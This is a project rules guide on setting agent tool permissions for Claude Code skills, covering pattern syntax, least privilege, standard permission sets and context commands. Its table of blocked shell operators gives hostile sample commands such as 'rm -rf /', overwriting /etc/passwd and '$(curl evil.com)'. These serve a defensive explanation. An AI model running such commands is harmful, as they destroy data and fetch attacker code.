---
created: 2026-01-16
modified: 2026-03-26
reviewed: 2026-03-26
paths:
  - "**/skills/**"
  - "**/SKILL.md"
  - "**/agents/**"
---

# Agentic Permissions

## Permission Modes

Claude Code supports two permission models:

| Mode | How it works | When to use |
|------|-------------|-------------|
| **Auto mode** | AI classifiers approve/deny actions across 3 tiers (safe tools, in-project edits, classifier). See `.claude/rules/auto-mode.md`. | Recommended default. Reduces approval fatigue while maintaining safety. |
| **Manual mode** | Users approve each action unless pre-allowed via `allowed-tools` or `settings.json`. | When deterministic, auditable control is required. |

### `allowed-tools` and Auto Mode

In both modes, `allowed-tools` in skill frontmatter defines the **subagent permission boundary** — when a skill runs via `agent:` or `Task`, only listed tools are available. In auto mode, the main session does not need granular Bash patterns since the classifier handles them.

**For new skills targeting auto mode**, broader patterns are acceptable:
```yaml
# Auto mode — classifier handles safety per-request
allowed-tools: Bash, Read, Edit, Write, Grep, Glob, TodoWrite
```

**For skills requiring manual mode compatibility**, use the granular patterns documented below.

## Manual Mode Permissions

Skills should use granular `allowed-tools` permissions to enable seamless, deterministic execution without interactive approval prompts.

## Permission Syntax

### Frontmatter Format

```yaml
allowed-tools: Bash(git status *), Bash(gh pr *), Read, TodoWrite
```

- Uses **space separator** between command and wildcard: `Bash(command *)`
- **Prefix matching**: `Bash(git diff *)` matches `git diff`, `git diff --cached`, `git diff --stat`
- Comma-separated list of tool permissions
- **`ask` tier**: Use `ask` to prompt the user for confirmation (neither auto-allow nor auto-deny):
  ```yaml
  allowed-tools: Bash(git push *):ask, Bash(git status *), Read
  ```
  The `:ask` suffix on a pattern means Claude can use the tool but will always prompt for confirmation.

### Pattern Examples

| Pattern | Matches |
|---------|---------|
| `Bash(git status *)` | `git status`, `git status --porcelain`, `git status -s` |
| `Bash(gh pr *)` | `gh pr view`, `gh pr checks`, `gh pr list --json` |
| `Bash(gh run *)` | `gh run view`, `gh run list`, `gh run view --log-failed` |
| `Bash(npm run *)` | `npm run test`, `npm run build`, `npm run lint` |

## Shell Operator Protections

Claude Code 2.1.7+ includes built-in protections against dangerous shell operators in permission patterns. As of 2.1.59, the "always allow" permission prompt handles compound bash commands more accurately — each subcommand is evaluated against permission patterns individually.

### Protected Operators

These operators are blocked by default when matched against permission patterns:

| Operator | Risk | Example |
|----------|------|---------|
| `&&` | Command chaining | `ls && rm -rf /` |
| `\|\|` | Conditional execution | `false \|\| malicious` |
| `;` | Command separation | `safe; dangerous` |
| `\|` | Pipe to other commands | `cat file \| curl` |
| `>` / `>>` | Output redirection | `echo bad > /etc/passwd` |
| `$()` | Command substitution | `$(curl evil.com)` |
| `` ` `` | Backtick substitution | `` `rm -rf /` `` |

### Security Behavior

When a Bash command contains shell operators:
1. The entire command is evaluated, not just the prefix
2. Permission patterns like `Bash(git *)` won't match `git status && rm -rf`
3. Users see a clear warning about the blocked operator

### Safe Patterns

```yaml
# These are safe - single commands only
allowed-tools: Bash(git status *), Bash(npm test *), Bash(bun run *)
```

### Scripts for Compound Operations

When a skill needs compound operations (validation checks, multi-step diagnostics, data aggregation), use **standalone shell scripts** instead of inline commands. This consolidates many granular permission patterns into one `Bash(bash *)` pattern.

**Anti-pattern** — many shell utility patterns that force inline bash:
```yaml
# Each generates complex inline commands requiring individual approval
allowed-tools: Bash(test *), Bash(jq *), Bash(head *), Bash(find *), Bash(cp *), Read
```

**Correct pattern** — standalone scripts with a single permission:
```yaml
# All script invocations auto-approved with one pattern
allowed-tools: Bash(bash *), Read, TodoWrite
```

Scripts live in `skills/<skill-name>/scripts/` and are invoked via:
```bash
bash "${CLAUDE_SKILL_DIR}/scripts/check-settings.sh" --home-dir "$HOME" --project-dir "$(pwd)"
```

#### When to Use Scripts vs Granular Patterns

| Use granular `Bash(command *)` | Use `Bash(bash *)` with scripts |
|-------------------------------|--------------------------------|
| Primary CLI tools (`git`, `gh`, `curl`, `npm`) | Shell utilities (`test`, `jq`, `find`, `cp`, `mkdir`) |
| Single-purpose commands | Multi-step validation/diagnostics |
| Commands that benefit from specific allowlisting | Compound operations needing `&&`, `||`, pipes |

#### Script Conventions

Scripts must follow these patterns (see `shell-scripting.md`):
- `#!/usr/bin/env bash` + `set -uo pipefail`
- Accept `--home-dir`, `--project-dir` for path portability
- Output structured `KEY=value` pairs with `=== SECTION ===` headers
- Use prefixed variable names (avoid reserved words)

## Design Principles

### 1. Granular Over Broad

Prefer specific command patterns over broad tool access.

Use specific command patterns:

```yaml
allowed-tools: Bash(git status *), Bash(git diff *), Bash(git add *), Read
```

### 2. Principle of Least Privilege

Only grant permissions needed for the command's purpose.

| Command Purpose | Appropriate Permissions |
|-----------------|------------------------|
| Read-only diagnostics | `Bash(git status *), Bash(gh pr view *), Read` |
| Commit workflow | Above + `Bash(git add *), Bash(git commit *)` |
| PR workflow | Above + `Bash(git push *), Bash(gh pr create *)` |

### 3. Deterministic Execution

Commands should run the same way every time. This means:
- Fixed command patterns in context sections
- JSON/porcelain output for machine parsing
- No ad-hoc piping that requires additional approval

## Standard Permission Sets

### Git Read-Only

```yaml
allowed-tools: Bash(git status *), Bash(git diff *), Bash(git log *), Bash(git branch *), Bash(git remote *), Read, Grep, Glob
```

### Git Read-Write

```yaml
allowed-tools: Bash(git status *), Bash(git diff *), Bash(git log *), Bash(git branch *), Bash(git add *), Bash(git commit *), Bash(git restore *), Read, Edit, Grep, Glob, TodoWrite
```

### Git + GitHub CLI

```yaml
allowed-tools: Bash(git status *), Bash(git diff *), Bash(git log *), Bash(git add *), Bash(git commit *), Bash(git push *), Bash(gh pr *), Bash(gh run *), Bash(gh issue *), Read, Edit, Grep, Glob, TodoWrite
```

### CI/CD Diagnostics

```yaml
allowed-tools: Bash(gh pr checks *), Bash(gh pr view *), Bash(gh run view *), Bash(gh run list *), Bash(git status *), Bash(git diff *), Bash(git log *), Read, Grep, Glob, TodoWrite
```

### Security Checks

```yaml
allowed-tools: Bash(gitleaks *), Bash(pre-commit *), Bash(git status *), Read, Grep, Glob, TodoWrite
```

## Machine-Readable Output

Commands should use output formats optimized for AI parsing.

### Git Commands

| Operation | Command |
|-----------|---------|
| Status | `git status --porcelain=v2 --branch` |
| Diff stats | `git diff --stat --numstat` |
| Log | `git log --format='%H %s' -n 10` |
| Branch info | `git branch -vv --format='%(refname:short) %(upstream:short) %(upstream:track)'` |

### GitHub CLI Commands

| Operation | Command |
|-----------|---------|
| PR checks | `gh pr checks $N --json name,state,conclusion,detailsUrl` |
| PR details | `gh pr view $N --json number,title,state,mergeable,statusCheckRollup` |
| Run details | `gh run view $ID --json conclusion,status,jobs,createdAt` |
| Failed logs | `gh run view $ID --log-failed` |
| Issue details | `gh issue view $N --json number,title,body,state,labels,assignees` |

## Project Settings Recommendation

### With Auto Mode (Recommended)

With auto mode enabled, granular Bash patterns in `settings.json` are unnecessary — the classifier handles them. Only add explicit permissions for tools auto mode does not cover:

```json
{
  "permissions": {
    "allow": [
      "WebFetch(domain:your-docs-site.com)",
      "mcp__your-mcp-server"
    ]
  }
}
```

### Without Auto Mode (Manual)

For manual mode, recommend adding to `.claude/settings.json`:

```json
{
  "permissions": {
    "allow": [
      "Bash(gh pr *)",
      "Bash(gh run *)",
      "Bash(gh issue *)",
      "Bash(git status *)",
      "Bash(git diff *)",
      "Bash(git log *)",
      "Bash(git add *)",
      "Bash(git commit *)",
      "Bash(git push *)",
      "Bash(git branch *)",
      "Bash(git remote *)",
      "Bash(pre-commit *)",
      "Bash(gitleaks *)"
    ]
  }
}
```

## Context Section Patterns

Context commands use `!` backtick syntax and are subject to shell operator protections.

### Context Command Patterns

Context commands must use plain commands without shell operators. The `>` in `2>/dev/null` is blocked by shell operator protections, just like `||`, `&&`, `|`, and `;`.

Commands that fail produce empty output, which is acceptable — the context system handles missing context gracefully.

Use `find` for file/directory discovery (succeeds with empty output when no matches):

```markdown
## Context

- Git status: !`git status --porcelain=v2 --branch`
- PR checks: !`gh pr checks $PR_NUMBER --json name,state,conclusion`
- Current branch: !`git branch --show-current`
- Config exists: !`test -f .config.json`
- Workflows: !`find .github/workflows -maxdepth 1 -name '*.yml'`
- Directories: !`find . -maxdepth 1 -type d \( -name 'src' -o -name 'lib' \)`
- Config files: !`find . -maxdepth 1 \( -name '*.config.js' -o -name '*.config.ts' \)`
```

### Handling Missing Context

- Commands that fail produce empty output — no error suppression needed
- Check for empty values before using them
- Provide defaults in the command logic
- Use existence checks (`test -f`, `test -d`) for boolean context

## Checklist for New Skills

### Auto Mode

- [ ] Lists all tools needed for subagent execution in `allowed-tools`
- [ ] Context commands use JSON/porcelain output
- [ ] Context commands contain no shell operators (`>`, `|`, `||`, `&&`, `;`)
- [ ] Context commands use `find` for file/directory discovery

### Manual Mode

- [ ] Uses granular `Bash(command *)` patterns for primary CLI tools
- [ ] Shell utility operations (`test`, `jq`, `find`, `cp`, `mkdir`) use scripts with `Bash(bash *)`
- [ ] Context commands use JSON/porcelain output
- [ ] Context commands contain no shell operators (`>`, `|`, `||`, `&&`, `;`)
- [ ] Context commands use `find` for file/directory discovery
- [ ] Only necessary permissions are granted
- [ ] Matches a standard permission set or documents why custom set is needed
